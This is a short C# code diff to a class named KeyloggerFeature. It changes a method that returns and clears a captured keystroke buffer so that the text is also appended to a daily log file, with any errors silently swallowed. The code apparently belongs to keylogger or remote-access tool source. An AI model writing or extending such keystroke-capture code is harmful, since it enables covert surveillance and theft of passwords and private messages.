@@ -102,13 +102,23 @@ internal static class KeyloggerFeature
 
     internal static string GetAndClearLogs()
     {
-        FlushToDisk();
+        string text;
         lock (_bufLock)
         {
-            var s = _buf.ToString();
+            text = _buf.ToString();
             _buf.Clear();
-            return s;
         }
+        // Also persist to disk so the daily log file stays complete
+        if (text.Length > 0)
+        {
+            try
+            {
+                Directory.CreateDirectory(_logDir);
+                File.AppendAllText(TodayFile, text, Encoding.UTF8);
+            }
+            catch { }
+        }
+        return text;
     }
 
     // ── File management ─────────────────────────────────────────────────────
